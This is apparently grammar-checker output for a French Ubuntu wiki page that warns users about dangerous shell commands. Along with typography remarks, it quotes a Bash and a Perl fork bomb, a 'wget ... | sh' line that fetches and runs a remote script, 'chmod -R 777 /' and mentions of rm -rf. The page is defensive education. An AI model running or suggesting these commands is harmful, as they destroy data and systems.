6 Espace(s) en fin de ligne à supprimer. => ====== Les commandes dangereuses ====== 

8 Il manque un espace insécable. => La ligne de commande est un outil puissant, et notamment très pratique pour détecter ou résoudre les problèmes : il en est donc souvent fait usage sur le forum ou dans la documentation. Cependant, certains utilisateurs malveillants peuvent donner des commandes dangereuses qui corrompent, voire détruisent le système, ou les données. L'exécution d'une commande nécessite donc toujours la plus grande prudence (utiliser la commande [[man]], moteurs de recherche, attente d'un deuxième avis, etc.).

9 Espace(s) en début de ligne à supprimer : utilisez les retraits de paragraphe (ou les tabulations à la rigueur). =>  

12 Il manque un espace insécable. => <note warning>Attention, ces commandes sont dangereuses, **ne les exécutez pas** !\\

17 Guillemets typographiques ouvrants. => <note >Les "QUELQUE_CHOSE", "QUELQUE_COMMANDE" et "QUELQUE_CHOSE_IMPORTANT" indiqués dans les commandes pouvant être remplacés par n'importe quelle chaîne de caractères.</note>
17 Mot inconnu : QUELQUE_CHOSE => <note >Les "QUELQUE_CHOSE", "QUELQUE_COMMANDE" et "QUELQUE_CHOSE_IMPORTANT" indiqués dans les commandes pouvant être remplacés par n'importe quelle chaîne de caractères.</note>
17 Guillemets typographiques fermants. => <note >Les "QUELQUE_CHOSE", "QUELQUE_COMMANDE" et "QUELQUE_CHOSE_IMPORTANT" indiqués dans les commandes pouvant être remplacés par n'importe quelle chaîne de caractères.</note>
17 Guillemets typographiques ouvrants. => <note >Les "QUELQUE_CHOSE", "QUELQUE_COMMANDE" et "QUELQUE_CHOSE_IMPORTANT" indiqués dans les commandes pouvant être remplacés par n'importe quelle chaîne de caractères.</note>
17 Mot inconnu : QUELQUE_COMMANDE => <note >Les "QUELQUE_CHOSE", "QUELQUE_COMMANDE" et "QUELQUE_CHOSE_IMPORTANT" indiqués dans les commandes pouvant être remplacés par n'importe quelle chaîne de caractères.</note>
17 Guillemets typographiques fermants. => <note >Les "QUELQUE_CHOSE", "QUELQUE_COMMANDE" et "QUELQUE_CHOSE_IMPORTANT" indiqués dans les commandes pouvant être remplacés par n'importe quelle chaîne de caractères.</note>
17 Guillemets typographiques ouvrants. => <note >Les "QUELQUE_CHOSE", "QUELQUE_COMMANDE" et "QUELQUE_CHOSE_IMPORTANT" indiqués dans les commandes pouvant être remplacés par n'importe quelle chaîne de caractères.</note>
17 Mot inconnu : QUELQUE_CHOSE_IMPORTANT => <note >Les "QUELQUE_CHOSE", "QUELQUE_COMMANDE" et "QUELQUE_CHOSE_IMPORTANT" indiqués dans les commandes pouvant être remplacés par n'importe quelle chaîne de caractères.</note>
17 Guillemets typographiques fermants. => <note >Les "QUELQUE_CHOSE", "QUELQUE_COMMANDE" et "QUELQUE_CHOSE_IMPORTANT" indiqués dans les commandes pouvant être remplacés par n'importe quelle chaîne de caractères.</note>

20 Mot inconnu : linux => Sous linux avec un terminal on peut tout faire, absolument tout. Donc lisez bien ceci :
20 Il manque un espace insécable. => Sous linux avec un terminal on peut tout faire, absolument tout. Donc lisez bien ceci :

21 Il manque un espace insécable. => Le danger de ces commandes est tout à fait évident : 
21 Espace(s) en fin de ligne à supprimer. => Le danger de ces commandes est tout à fait évident : 

23 Il manque un espace insécable. => Règle n° 1 : NE JAMAIS VALIDER UNE COMMANDE QUI POURRAIT VOUS FAIRE PERDRE VOS DONNÉES ET VOTRE SYSTÈME.</note>

27 Il manque un espace insécable. => Celles qui peuvent tout effacer (fichier système ou données personnelles) :

43 Il manque un espace insécable. => est aussi redoutable : elle redirige du rien en écrasant les fichiers.

45 Guillemets typographiques ouvrants. => ainsi que toutes les variantes commençant par 'rm' et 'mv' et se terminant par /dev/null
45 Mot inconnu : rm => ainsi que toutes les variantes commençant par 'rm' et 'mv' et se terminant par /dev/null
45 Guillemets typographiques fermants. => ainsi que toutes les variantes commençant par 'rm' et 'mv' et se terminant par /dev/null
45 Guillemets typographiques ouvrants. => ainsi que toutes les variantes commençant par 'rm' et 'mv' et se terminant par /dev/null
45 Mot inconnu : mv => ainsi que toutes les variantes commençant par 'rm' et 'mv' et se terminant par /dev/null
45 Guillemets typographiques fermants. => ainsi que toutes les variantes commençant par 'rm' et 'mv' et se terminant par /dev/null

46 Il manque un espace insécable. => Pourquoi ?

48 Espace(s) en début de ligne à supprimer : utilisez les retraits de paragraphe (ou les tabulations à la rigueur). =>   * rm est la commande de suppression des fichiers sous Gnu/Linux, rm quelque chose supprimera ce quelque chose, imaginez que vous supprimez tous vos fichiers système ( racine / ) , ou vos fichier personnels ( /home/<votreidentifiant/ ) !
48 Mot inconnu : rm =>   * rm est la commande de suppression des fichiers sous Gnu/Linux, rm quelque chose supprimera ce quelque chose, imaginez que vous supprimez tous vos fichiers système ( racine / ) , ou vos fichier personnels ( /home/<votreidentifiant/ ) !
48 Mot inconnu : Gnu =>   * rm est la commande de suppression des fichiers sous Gnu/Linux, rm quelque chose supprimera ce quelque chose, imaginez que vous supprimez tous vos fichiers système ( racine / ) , ou vos fichier personnels ( /home/<votreidentifiant/ ) !
48 Mot inconnu : rm =>   * rm est la commande de suppression des fichiers sous Gnu/Linux, rm quelque chose supprimera ce quelque chose, imaginez que vous supprimez tous vos fichiers système ( racine / ) , ou vos fichier personnels ( /home/<votreidentifiant/ ) !
48 Pas d’espace après ce signe. =>   * rm est la commande de suppression des fichiers sous Gnu/Linux, rm quelque chose supprimera ce quelque chose, imaginez que vous supprimez tous vos fichiers système ( racine / ) , ou vos fichier personnels ( /home/<votreidentifiant/ ) !
48 Pas d’espace avant ce signe. =>   * rm est la commande de suppression des fichiers sous Gnu/Linux, rm quelque chose supprimera ce quelque chose, imaginez que vous supprimez tous vos fichiers système ( racine / ) , ou vos fichier personnels ( /home/<votreidentifiant/ ) !
48 Pas d’espace avant une virgule. =>   * rm est la commande de suppression des fichiers sous Gnu/Linux, rm quelque chose supprimera ce quelque chose, imaginez que vous supprimez tous vos fichiers système ( racine / ) , ou vos fichier personnels ( /home/<votreidentifiant/ ) !
48 Accord de nombre erroné : « fichier » devrait être au pluriel. =>   * rm est la commande de suppression des fichiers sous Gnu/Linux, rm quelque chose supprimera ce quelque chose, imaginez que vous supprimez tous vos fichiers système ( racine / ) , ou vos fichier personnels ( /home/<votreidentifiant/ ) !
48 Pas d’espace après ce signe. =>   * rm est la commande de suppression des fichiers sous Gnu/Linux, rm quelque chose supprimera ce quelque chose, imaginez que vous supprimez tous vos fichiers système ( racine / ) , ou vos fichier personnels ( /home/<votreidentifiant/ ) !
48 Mot inconnu : votreidentifiant =>   * rm est la commande de suppression des fichiers sous Gnu/Linux, rm quelque chose supprimera ce quelque chose, imaginez que vous supprimez tous vos fichiers système ( racine / ) , ou vos fichier personnels ( /home/<votreidentifiant/ ) !
48 Pas d’espace avant ce signe. =>   * rm est la commande de suppression des fichiers sous Gnu/Linux, rm quelque chose supprimera ce quelque chose, imaginez que vous supprimez tous vos fichiers système ( racine / ) , ou vos fichier personnels ( /home/<votreidentifiant/ ) !
48 Il manque un espace insécable. =>   * rm est la commande de suppression des fichiers sous Gnu/Linux, rm quelque chose supprimera ce quelque chose, imaginez que vous supprimez tous vos fichiers système ( racine / ) , ou vos fichier personnels ( /home/<votreidentifiant/ ) !

51 Forme interrogative ? Mettez un trait d’union. => Assurez vous que :
51 Il manque un espace insécable. => Assurez vous que :

52 Espace(s) en début de ligne à supprimer : utilisez les retraits de paragraphe (ou les tabulations à la rigueur). =>   * un avertissement vous prévient et vous en assumerez les conséquences en cas de perte de données.

53 Espace(s) en début de ligne à supprimer : utilisez les retraits de paragraphe (ou les tabulations à la rigueur). =>   * la documentation est bien claire, bien rédigée, explicite.

55 Il manque un espace insécable. => Protection remplacer le plus souvent possible cette commande par :
56 Il manque un espace à côté du tiret. => <code>rm -i <nom du fichier à supprimer></code> ( mode interactif avec confirmation de suppression )
56 Pas d’espace après ce signe. => <code>rm -i <nom du fichier à supprimer></code> ( mode interactif avec confirmation de suppression )
56 Pas d’espace avant ce signe. => <code>rm -i <nom du fichier à supprimer></code> ( mode interactif avec confirmation de suppression )

57 Mot inconnu : mv => Vous pouvez aussi utiliser la commande mv ( déplacer )
57 Pas d’espace après ce signe. => Vous pouvez aussi utiliser la commande mv ( déplacer )
57 Pas d’espace avant ce signe. => Vous pouvez aussi utiliser la commande mv ( déplacer )

60 Il manque un espace insécable. => Exemple :

62 Mot inconnu : jpeg => Suppression du fichier labrador.jpeg (une image)

63 Il manque un espace insécable. => au lieu d'exécuter :

66 Il manque un espace insécable. => Entrez plutôt :
67 Il manque un espace à côté du tiret. => <code>rm -i labrador.jpeg</code>

70 Il manque un espace insécable. => <note help>Un doute ? [[http://forum.ubuntu-fr.org|Posez vos questions sur le forum : http://forum.ubuntu-fr.org]]</note>
70 Il manque un espace insécable. => <note help>Un doute ? [[http://forum.ubuntu-fr.org|Posez vos questions sur le forum : http://forum.ubuntu-fr.org]]</note>

73 Il manque un espace insécable. => Règle n° 2 : NE JAMAIS ou du moins LE MOINS POSSIBLE OUVRIR NAUTILUS (LE GESTIONNAIRE DE FICHIERS) EN MODE SUPER UTILISATEUR (ROOT) VOUS POURRIEZ PERDRE VOS DONNÉES ET ENDOMMAGER VOTRE SYSTÈME.</note>
73 Mot inconnu : NAUTILUS => Règle n° 2 : NE JAMAIS ou du moins LE MOINS POSSIBLE OUVRIR NAUTILUS (LE GESTIONNAIRE DE FICHIERS) EN MODE SUPER UTILISATEUR (ROOT) VOUS POURRIEZ PERDRE VOS DONNÉES ET ENDOMMAGER VOTRE SYSTÈME.</note>
73 Mot inconnu : ROOT => Règle n° 2 : NE JAMAIS ou du moins LE MOINS POSSIBLE OUVRIR NAUTILUS (LE GESTIONNAIRE DE FICHIERS) EN MODE SUPER UTILISATEUR (ROOT) VOUS POURRIEZ PERDRE VOS DONNÉES ET ENDOMMAGER VOTRE SYSTÈME.</note>

75 Espace(s) en début de ligne à supprimer : utilisez les retraits de paragraphe (ou les tabulations à la rigueur). =>   * La commande find peut aussi être dangereuse, avec son paramètre -exec qui permet d'exécuter une commande sur le résultat d'une recherche.
75 Mot inconnu : find =>   * La commande find peut aussi être dangereuse, avec son paramètre -exec qui permet d'exécuter une commande sur le résultat d'une recherche.
75 Il manque un espace à côté du tiret. =>   * La commande find peut aussi être dangereuse, avec son paramètre -exec qui permet d'exécuter une commande sur le résultat d'une recherche.
75 Mot inconnu : exec =>   * La commande find peut aussi être dangereuse, avec son paramètre -exec qui permet d'exécuter une commande sur le résultat d'une recherche.

76 Il manque un espace insécable. => Par exemple, la commande suivante est très dangereuse : elle provoque la suppressions de tous les fichiers.
76 Accord de nombre erroné : « suppressions » devrait être au singulier. => Par exemple, la commande suivante est très dangereuse : elle provoque la suppressions de tous les fichiers.

78 Mot inconnu : rm => De même pour **rm** qui est utilisé.

81 Mot inconnu : mkfs => Les données sur le périphérique mentionné après la commande mkfs seront détruites et remplacées par un système de fichier vide : 
81 Il manque un espace insécable. => Les données sur le périphérique mentionné après la commande mkfs seront détruites et remplacées par un système de fichier vide : 
81 Espace(s) en fin de ligne à supprimer. => Les données sur le périphérique mentionné après la commande mkfs seront détruites et remplacées par un système de fichier vide : 

91 Il manque un espace insécable. => Écrit des données sur le périphérique et peut entraîner la perte totale des données : 
91 Espace(s) en fin de ligne à supprimer. => Écrit des données sur le périphérique et peut entraîner la perte totale des données : 

98 Mot inconnu : Forkbomb => ===== Forkbomb =====

102 Mot inconnu : Bash => Avec le shell Bash : 
102 Il manque un espace insécable. => Avec le shell Bash : 
102 Espace(s) en fin de ligne à supprimer. => Avec le shell Bash : 

104 Espace(s) en début de ligne à supprimer : utilisez les retraits de paragraphe (ou les tabulations à la rigueur). =>   :(){:|:&};:
104 Une de ces ponctuations est superflue. =>   :(){:|:&};:

106 Il manque un espace insécable. => En Perl :

108 Espace(s) en début de ligne à supprimer : utilisez les retraits de paragraphe (ou les tabulations à la rigueur). =>   perl -e "fork while fork"
108 Mot inconnu : perl =>   perl -e "fork while fork"
108 Il manque un espace à côté du tiret. =>   perl -e "fork while fork"
108 Guillemets typographiques ouvrants. =>   perl -e "fork while fork"
108 Mot inconnu : while =>   perl -e "fork while fork"
108 Guillemets typographiques fermants. =>   perl -e "fork while fork"

110 Mot inconnu : bombs => Si vous voulez savoir comment se protéger contre les forks bombs allez voir [[:tutoriel:comment_se_proteger_des_fork_bomb|ici]].
110 Il manque un espace. => Si vous voulez savoir comment se protéger contre les forks bombs allez voir [[:tutoriel:comment_se_proteger_des_fork_bomb|ici]].

112 Mot inconnu : Tarbomb => ===== Tarbomb =====

114 Mot inconnu : tar => Quelqu'un vous demande d'extraire une archive dans un répertoire existant. Cette archive tar peut être conçue pour exploser en un grand nombre de fichiers, voire écraser les fichiers de l'utilisateur qui portent le même nom que ceux de l'archive. Vous devriez donc prendre l'habitude de décompresser des tar dans un nouveau répertoire vide.
114 Mot inconnu : tar => Quelqu'un vous demande d'extraire une archive dans un répertoire existant. Cette archive tar peut être conçue pour exploser en un grand nombre de fichiers, voire écraser les fichiers de l'utilisateur qui portent le même nom que ceux de l'archive. Vous devriez donc prendre l'habitude de décompresser des tar dans un nouveau répertoire vide.

116 Mot inconnu : tar => <note important>On parle ici de fichiers tar, mais c'est valable pour tous les formats de compression existant (zip, gzip, tar-gz etc...)</note>
116 Mot inconnu : gzip => <note important>On parle ici de fichiers tar, mais c'est valable pour tous les formats de compression existant (zip, gzip, tar-gz etc...)</note>
116 Mot inconnu : tar-gz => <note important>On parle ici de fichiers tar, mais c'est valable pour tous les formats de compression existant (zip, gzip, tar-gz etc...)</note>
116 Avant « etc. », il faut mettre une virgule. => <note important>On parle ici de fichiers tar, mais c'est valable pour tous les formats de compression existant (zip, gzip, tar-gz etc...)</note>
116 Un seul point après « etc. » => <note important>On parle ici de fichiers tar, mais c'est valable pour tous les formats de compression existant (zip, gzip, tar-gz etc...)</note>

117 Mot inconnu : Decompression => ===== Decompression bomb =====
117 Mot inconnu : bomb => ===== Decompression bomb =====

123 Il manque un espace insécable. => Quelqu'un vous donne le lien vers un script shell à exécuter. Il peut contenir n'importe quelle commande (bénigne ou malveillante). Vous ne devriez pas exécuter du code de personnes à qui vous ne faites pas confiance : 
123 Espace(s) en fin de ligne à supprimer. => Quelqu'un vous donne le lien vers un script shell à exécuter. Il peut contenir n'importe quelle commande (bénigne ou malveillante). Vous ne devriez pas exécuter du code de personnes à qui vous ne faites pas confiance : 

125 Espace(s) en début de ligne à supprimer : utilisez les retraits de paragraphe (ou les tabulations à la rigueur). =>   wget http://une_adresse/un_fichier
125 Mot inconnu : wget =>   wget http://une_adresse/un_fichier

126 Espace(s) en début de ligne à supprimer : utilisez les retraits de paragraphe (ou les tabulations à la rigueur). =>   sh ./un_fichier
126 Mot inconnu : sh =>   sh ./un_fichier
126 Mot inconnu : un_fichier =>   sh ./un_fichier

128 Espace(s) en début de ligne à supprimer : utilisez les retraits de paragraphe (ou les tabulations à la rigueur). =>   wget http://une_adresse/un_fichier -O- | sh
128 Mot inconnu : wget =>   wget http://une_adresse/un_fichier -O- | sh
128 Il manque un espace à côté du tiret. =>   wget http://une_adresse/un_fichier -O- | sh
128 Mot inconnu : sh =>   wget http://une_adresse/un_fichier -O- | sh

132 Guillemets typographiques ouvrants. => Une fois ce script lancé, vous avez une "chance" sur 6 pour que tous les fichiers à la racine de votre système soient effacés. Faites attention à ce script et ses variantes !
132 Guillemets typographiques fermants. => Une fois ce script lancé, vous avez une "chance" sur 6 pour que tous les fichiers à la racine de votre système soient effacés. Faites attention à ce script et ses variantes !
132 Il manque un espace insécable. => Une fois ce script lancé, vous avez une "chance" sur 6 pour que tous les fichiers à la racine de votre système soient effacés. Faites attention à ce script et ses variantes !

139 Espace(s) en fin de ligne à supprimer. => </code> 

143 Mot inconnu : SourceForge => Quelqu'un vous donne le code source et vous dit de le compiler. Il est facile de cacher du code malveillant dans un long code source, et le code source donne à l'attaquant beaucoup de possibilités pour déguiser son code malveillant. Vous ne devriez pas compiler ou exécuter le code compilé, à moins qu'il ne s'agisse d'une application bien connue, obtenue à partir d'un site réputé (SourceForge, les sites Ubuntu, etc.).

145 Il manque un espace insécable. => Par exemple :

161 Guillemets typographiques ouvrants. => Ceci est la forme hexadécimale de ''rm -rf'' qui va détruire votre répertoire en tant que simple utilisateur, ou tous les fichiers en tant que root.
161 Mot inconnu : rm => Ceci est la forme hexadécimale de ''rm -rf'' qui va détruire votre répertoire en tant que simple utilisateur, ou tous les fichiers en tant que root.
161 Il manque un espace à côté du tiret. => Ceci est la forme hexadécimale de ''rm -rf'' qui va détruire votre répertoire en tant que simple utilisateur, ou tous les fichiers en tant que root.
161 Mot inconnu : rf => Ceci est la forme hexadécimale de ''rm -rf'' qui va détruire votre répertoire en tant que simple utilisateur, ou tous les fichiers en tant que root.
161 Guillemets typographiques fermants. => Ceci est la forme hexadécimale de ''rm -rf'' qui va détruire votre répertoire en tant que simple utilisateur, ou tous les fichiers en tant que root.
161 Mot inconnu : root => Ceci est la forme hexadécimale de ''rm -rf'' qui va détruire votre répertoire en tant que simple utilisateur, ou tous les fichiers en tant que root.

165 Espace(s) en début de ligne à supprimer : utilisez les retraits de paragraphe (ou les tabulations à la rigueur). =>   chmod -R 777 /
165 Mot inconnu : chmod =>   chmod -R 777 /
165 Il manque un espace à côté du tiret. =>   chmod -R 777 /

170 Il manque un espace insécable. => Pour info :

171 Il manque un espace insécable. => un / non modifié :
203 Il manque un espace à côté du tiret. => Plus généralement, attention aux changements de droits, surtout quand ils s'appliquent sur des dossiers. Par exemple un <code>chmod -R xxx /home/votre_utilisateur</code> **peut vous obliger à recréer un compte utilisateur, vu que certains fichiers nécessitent des droits particuliers.**

207 Espace(s) en début de ligne à supprimer : utilisez les retraits de paragraphe (ou les tabulations à la rigueur). =>   sudo passwd root
207 Mot inconnu : sudo =>   sudo passwd root
207 Mot inconnu : passwd =>   sudo passwd root
207 Mot inconnu : root =>   sudo passwd root

209 Guillemets typographiques ouvrants. => La commande "sudo passwd root " peut vous faire perdre vos droits sudo !!
209 Mot inconnu : sudo => La commande "sudo passwd root " peut vous faire perdre vos droits sudo !!
209 Mot inconnu : passwd => La commande "sudo passwd root " peut vous faire perdre vos droits sudo !!
209 Mot inconnu : root => La commande "sudo passwd root " peut vous faire perdre vos droits sudo !!
209 Guillemets isolés. => La commande "sudo passwd root " peut vous faire perdre vos droits sudo !!
209 Mot inconnu : sudo => La commande "sudo passwd root " peut vous faire perdre vos droits sudo !!
209 Il manque un espace insécable. => La commande "sudo passwd root " peut vous faire perdre vos droits sudo !!

211 Mot inconnu : sudo => 8-) Pour récupérer ses droits sudo sur son compte, se loguer en root ("sudo -i") et tapez :
211 Mot inconnu : root => 8-) Pour récupérer ses droits sudo sur son compte, se loguer en root ("sudo -i") et tapez :
211 Guillemets typographiques ouvrants. => 8-) Pour récupérer ses droits sudo sur son compte, se loguer en root ("sudo -i") et tapez :
211 Mot inconnu : sudo => 8-) Pour récupérer ses droits sudo sur son compte, se loguer en root ("sudo -i") et tapez :
211 Il manque un espace à côté du tiret. => 8-) Pour récupérer ses droits sudo sur son compte, se loguer en root ("sudo -i") et tapez :
211 Guillemets typographiques fermants. => 8-) Pour récupérer ses droits sudo sur son compte, se loguer en root ("sudo -i") et tapez :
211 Il manque un espace insécable. => 8-) Pour récupérer ses droits sudo sur son compte, se loguer en root ("sudo -i") et tapez :

213 Espace(s) en début de ligne à supprimer : utilisez les retraits de paragraphe (ou les tabulations à la rigueur). =>   adduser votre_username sudo
213 Mot inconnu : adduser =>   adduser votre_username sudo
213 Mot inconnu : votre_username =>   adduser votre_username sudo
213 Mot inconnu : sudo =>   adduser votre_username sudo

217 Il manque un espace insécable. => Encore une fois, il ne s'agit pas de donner une liste complète des commandes malveillantes, et il ne faut pas utiliser cette page comme une liste de vérification pour déterminer si une commande est dangereuse ou pas ! Cette page est simplement éducative, pour faire prendre conscience à l'utilisateur du danger potentiel du shell. Toute commande ne doit être exécutée que si elle est sûre et si l'on comprend ce que l'on fait.

219 Espace(s) en fin de ligne à supprimer. => Le meilleur moyen d'évaluer les risques est probablement l'utilisation de la commande [[:man]]. 

223 Il manque un espace insécable. => //Contributeurs principaux : [[utilisateurs:на_краю]], [[utilisateurs:tshirtman]], [[utilisateurs:morgen_stern]].//
223 Il manque un espace. => //Contributeurs principaux : [[utilisateurs:на_краю]], [[utilisateurs:tshirtman]], [[utilisateurs:morgen_stern]].//
223 Il manque un espace. => //Contributeurs principaux : [[utilisateurs:на_краю]], [[utilisateurs:tshirtman]], [[utilisateurs:morgen_stern]].//
223 Il manque un espace. => //Contributeurs principaux : [[utilisateurs:на_краю]], [[utilisateurs:tshirtman]], [[utilisateurs:morgen_stern]].//

225 Il manque un espace insécable. => //Basé sur « [[http://ubuntuforums.org/announcement.php?f=359|ATTENTION ALL USERS: Malicious Commands]] » par jdong.//
225 Mot inconnu : ALL => //Basé sur « [[http://ubuntuforums.org/announcement.php?f=359|ATTENTION ALL USERS: Malicious Commands]] » par jdong.//
225 Mot inconnu : USERS => //Basé sur « [[http://ubuntuforums.org/announcement.php?f=359|ATTENTION ALL USERS: Malicious Commands]] » par jdong.//
225 Il manque un espace insécable. => //Basé sur « [[http://ubuntuforums.org/announcement.php?f=359|ATTENTION ALL USERS: Malicious Commands]] » par jdong.//
225 Mot inconnu : Malicious => //Basé sur « [[http://ubuntuforums.org/announcement.php?f=359|ATTENTION ALL USERS: Malicious Commands]] » par jdong.//
225 Mot inconnu : Commands => //Basé sur « [[http://ubuntuforums.org/announcement.php?f=359|ATTENTION ALL USERS: Malicious Commands]] » par jdong.//
225 Il manque un espace insécable. => //Basé sur « [[http://ubuntuforums.org/announcement.php?f=359|ATTENTION ALL USERS: Malicious Commands]] » par jdong.//
225 Mot inconnu : jdong => //Basé sur « [[http://ubuntuforums.org/announcement.php?f=359|ATTENTION ALL USERS: Malicious Commands]] » par jdong.//
